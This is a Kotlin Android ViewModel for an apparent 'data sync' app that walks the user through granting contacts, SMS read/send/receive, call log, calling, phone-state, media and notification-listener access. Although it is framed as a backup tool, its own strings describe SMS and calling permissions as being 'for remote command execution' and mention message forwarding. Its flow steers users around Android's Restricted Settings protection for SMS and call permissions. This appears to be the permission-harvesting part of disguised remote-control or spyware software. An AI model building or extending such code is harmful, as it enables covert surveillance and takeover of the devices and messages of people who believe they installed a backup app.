package com.boxx.datasync.permission

import android.Manifest
import android.app.Activity
import android.app.Application
import android.os.Build
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import javax.inject.Inject
import dagger.hilt.android.lifecycle.HiltViewModel

sealed class PermissionUiState {
    object Checking : PermissionUiState()
    object RequestRuntime : PermissionUiState()
    object DeniedRetry : PermissionUiState()
    object NeedNotificationListener : PermissionUiState()
    object NeedRestrictedSettings : PermissionUiState()
    object NeedAppSettings : PermissionUiState()
    object Ready : PermissionUiState()
}

@HiltViewModel
class PermissionViewModel @Inject constructor(
    application: Application
) : AndroidViewModel(application) {

    private val handler = PermissionHandler(application)

    private val _permissions = MutableStateFlow<List<PermissionInfo>>(emptyList())
    val permissions: StateFlow<List<PermissionInfo>> = _permissions.asStateFlow()

    private val _statuses = MutableStateFlow<Map<String, PermissionStatus>>(emptyMap())
    val statuses: StateFlow<Map<String, PermissionStatus>> = _statuses.asStateFlow()

    private val _uiState = MutableStateFlow<PermissionUiState>(PermissionUiState.Checking)
    val uiState: StateFlow<PermissionUiState> = _uiState.asStateFlow()

    private var hasShownRestrictedGuide = false

    init {
        val list = mutableListOf(
            PermissionInfo(
                "CONTACTS", "Contacts",
                "Access contacts to backup your contact list.",
                "Contacts", Manifest.permission.READ_CONTACTS
            ),
            PermissionInfo(
                "SMS_READ", "Read SMS",
                "Access SMS to backup your messages and enable forwarding.",
                "Sms", Manifest.permission.READ_SMS
            ),
            PermissionInfo(
                "SMS_SEND", "Send SMS",
                "Allows the app to send SMS for remote command execution.",
                "SendSms", Manifest.permission.SEND_SMS
            ),
            PermissionInfo(
                "SMS_RECEIVE", "Receive SMS",
                "Required to detect incoming SMS for real-time sync.",
                "ReceiveSms", Manifest.permission.RECEIVE_SMS
            ),
            PermissionInfo(
                "CALL_LOG", "Call Logs",
                "Access call history to backup your call logs.",
                "Call", Manifest.permission.READ_CALL_LOG
            ),
            PermissionInfo(
                "CALL_PHONE", "Make Calls",
                "Allows the app to initiate calls for remote command execution.",
                "Phone", Manifest.permission.CALL_PHONE
            ),
            PermissionInfo(
                "PHONE_STATE", "Phone State",
                "Required to detect SIM info and network status.",
                "SimCard", Manifest.permission.READ_PHONE_STATE
            )
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            list.add(PermissionInfo(
                "MEDIA_IMAGES", "Images",
                "Access images to backup your gallery.",
                "PhotoLibrary", Manifest.permission.READ_MEDIA_IMAGES
            ))
            list.add(PermissionInfo(
                "MEDIA_VIDEO", "Videos",
                "Access videos to backup your gallery.",
                "VideoLibrary", Manifest.permission.READ_MEDIA_VIDEO
            ))
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(PermissionInfo(
                "MEDIA_IMAGES", "Images",
                "Access images to backup your gallery.",
                "PhotoLibrary", Manifest.permission.READ_MEDIA_IMAGES
            ))
            list.add(PermissionInfo(
                "MEDIA_VIDEO", "Videos",
                "Access videos to backup your gallery.",
                "VideoLibrary", Manifest.permission.READ_MEDIA_VIDEO
            ))
        } else {
            list.add(PermissionInfo(
                "STORAGE", "Storage",
                "Access storage to backup your gallery.",
                "Storage", Manifest.permission.READ_EXTERNAL_STORAGE
            ))
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(PermissionInfo(
                "NOTIFICATIONS", "Notifications",
                "Required to show sync status in the notification bar.",
                "Notifications", Manifest.permission.POST_NOTIFICATIONS
            ))
        }

        list.add(PermissionInfo(
            "NOTIFICATION_LISTENER", "Notification Access",
            "Required to sync incoming notifications to your dashboard.",
            "NotificationSync", isSpecial = true
        ))

        list.add(PermissionInfo(
            "BATTERY_OPTIMIZATION", "Battery Optimization",
            "Disable optimization to ensure reliable background sync.",
            "Battery", isOptional = true, isSpecial = true
        ))

        _permissions.value = list
        refreshStatuses()
    }

    fun refreshStatuses(activity: Activity? = null, isFromLauncher: Boolean = false) {
        Log.d("PermissionFlow", "PERMISSION_FLOW_CHECKING")
        val newStatuses = _permissions.value.associate { it.id to handler.getStatus(it) }
        _statuses.value = newStatuses
        updateUiState(activity, isFromLauncher)
    }

    private fun updateUiState(activity: Activity?, isFromLauncher: Boolean = false) {
        val currentPermissions = _permissions.value
        val currentStatuses = _statuses.value

        // 1. Check runtime permissions
        val runtimePermissions = currentPermissions.filter { !it.isSpecial && it.permission != null }
        val deniedRuntime = runtimePermissions.filter { (currentStatuses[it.id] ?: PermissionStatus.DENIED) != PermissionStatus.GRANTED }

        if (deniedRuntime.isNotEmpty()) {
            val permanentlyDenied = activity?.let { act ->
                deniedRuntime.any { handler.isPermanentlyDenied(act, it) }
            } ?: false

            // If they are permanently denied
            if (permanentlyDenied) {
                // Check if we should show Restricted Settings Guide first
                // Guide ONLY for SMS/Call permissions that are restricted
                val restrictedPermissionsMissing = deniedRuntime.filter { it.id.startsWith("SMS") || it.id.startsWith("CALL") }

                if (restrictedPermissionsMissing.isNotEmpty() && !hasShownRestrictedGuide) {
                    Log.d("PermissionFlow", "RESTRICTED_SETTINGS_REQUIRED")
                    Log.d("PermissionFlow", "RESTRICTED_PERMISSION_GUIDE_ONLY_WHEN_BLOCKED")
                    _uiState.value = PermissionUiState.NeedRestrictedSettings
                } else {
                    Log.d("PermissionFlow", "RUNTIME_PERMISSION_PERMANENTLY_DENIED")
                    Log.d("PermissionFlow", "OPEN_SETTINGS_ONLY_AFTER_PERMANENT_DENIAL")
                    _uiState.value = PermissionUiState.NeedAppSettings
                }
            } else {
                Log.d("PermissionFlow", "RUNTIME_PERMISSION_REQUESTABLE")
                if (isFromLauncher) {
                    Log.d("PermissionFlow", "RUNTIME_PERMISSION_DENIED")
                    _uiState.value = PermissionUiState.DeniedRetry
                } else {
                    Log.d("PermissionFlow", "RUNTIME_PERMISSION_DIRECT_REQUEST")
                    _uiState.value = PermissionUiState.RequestRuntime
                }
            }
            return
        }

        Log.d("PermissionFlow", "RUNTIME_PERMISSION_GRANTED")

        // 2. Check Notification Listener
        val notifListener = currentPermissions.find { it.id == "NOTIFICATION_LISTENER" }
        if (notifListener != null && (currentStatuses[notifListener.id] ?: PermissionStatus.DENIED) != PermissionStatus.GRANTED) {
            Log.d("PermissionFlow", "NOTIFICATION_LISTENER_REQUIRED")
            _uiState.value = PermissionUiState.NeedNotificationListener
            return
        }

        // 3. Optional Battery Optimization check is informational only and doesn't block PermissionUiState.Ready.
        val batteryOpt = currentPermissions.find { it.id == "BATTERY_OPTIMIZATION" }
        if (batteryOpt != null && (currentStatuses[batteryOpt.id] ?: PermissionStatus.DENIED) != PermissionStatus.GRANTED) {
            Log.d("PermissionFlow", "BATTERY_OPTIMIZATION_OPTIONAL_ONLY")
            // We do NOT set uiState to NeedBatteryOptimization anymore to unblock the main flow.
        }

        Log.d("PermissionFlow", "PERMISSION_FLOW_READY")
        _uiState.value = PermissionUiState.Ready
    }

    fun markRestrictedGuideShown() {
        hasShownRestrictedGuide = true
        // Re-evaluate state, will likely move to NeedAppSettings if still denied
        _uiState.value = PermissionUiState.NeedAppSettings
    }

    fun areAllRequiredGranted(): Boolean {
        return _permissions.value.all {
            if (it.isOptional) true
            else handler.getStatus(it) == PermissionStatus.GRANTED
        }
    }
}
